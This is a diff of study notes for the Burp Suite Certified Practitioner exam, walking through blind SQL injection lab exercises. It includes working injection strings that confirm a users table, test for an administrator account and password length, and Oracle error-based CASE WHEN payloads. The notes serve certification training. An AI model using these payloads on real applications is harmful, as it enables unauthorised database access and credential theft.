@@ -123,7 +123,7 @@
 ![image](https://github.com/madslaz/Burp-Suite-Certified-Practitioner/assets/52518274/4245f3e7-f716-4f97-afb3-3ab9a26ecd6f)
 
 2.  We can then verify that a table called users exists with `0s7Sc0dx14D3iJ8x' AND (SELECT 'whatever' from users LIMIT 1)='whatever` Now, let's verify that administrator exists with `0s7Sc0dx14D3iJ8x' AND (SELECT 'whatever' from users WHERE username='administrator')='whatever`.
-3.  We can figure out the length by inserting an AND LENGTH clause, `0s7Sc0dx14D3iJ8x' AND (SELECT 'whatever' from users WHERE username='administrator' AND LENGTH(password)=20)='whatever`. We found it was 20 after iterating through >s. 
+3.  We can figure out the length by inserting an AND LENGTH clause, `0s7Sc0dx14D3iJ8x' AND (SELECT 'whatever' FROM users WHERE username='administrator' AND LENGTH(password)=20)='whatever`. We found it was 20 after iterating through >s. 
 
 ![image](https://github.com/madslaz/Burp-Suite-Certified-Practitioner/assets/52518274/f11d5925-f4dc-46e4-97b9-29c79c20a829)
 
@@ -143,7 +143,13 @@
   - `XYZ' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)+'a` ~ 1/0 causes divide-by-zero error
 - Need to determine what the error is and whether it is indicative of SQL processing. Thanks to the hint, we know this is an Oracle database:
   - Adding a single quotation mark gave us an error ('), while 2 quotation marks ('') did not cause an error - hint to SQL processing? Since we know it's Oracle,   let's attempt a subquery calling from the Oracle table, dual: `'||(SELECT '' FROM dual)||'` - Remember, since this is blind SQL injection, we can't use UNION attacks.
-  - If you're having trouble envisioning what's going on with this concat, build out the strings -> `jLxqfFPoA20MH5Au'||(SELECT '' FROM dual)||'` is `'jLxqfFPoA20MH5Au'(SELECT '' FROM dual)''` -> || is appending one string to another string. You gotta account for the quotes that are automatically inserted by the application itself. 
-  
+  - If you're having trouble envisioning what's going on with this concat, build out the strings -> `jLxqfFPoA20MH5Au'||(SELECT '' FROM dual)||'` is `'jLxqfFPoA20MH5Au'(SELECT '' FROM dual)''` -> || is appending one string to another string. You gotta account for the quotes that are automatically inserted by the application itself.
+  - Inserting a fake table, such as `Z1xYCr6Y4IQXrVOI'||(SELECT '' FROM fake)||'` results in an Internal Server Error.
+  - Let's try some test conditions:
+    ` Z1xYCr6Y4IQXrVOI'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'` results in an error, as 1=1, therefore the expression is evaluated to divide by zero, resulting in an error.
+    `Z1xYCr6Y4IQXrVOI'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'` results in no error, as 1 does not = 2, so the expression is ELSE'd to END FROM dual
+
+![image](https://github.com/madslaz/Burp-Suite-Certified-Practitioner/assets/52518274/bf3e8f08-3071-447e-b132-1b2e9a5db829)
+
     
 
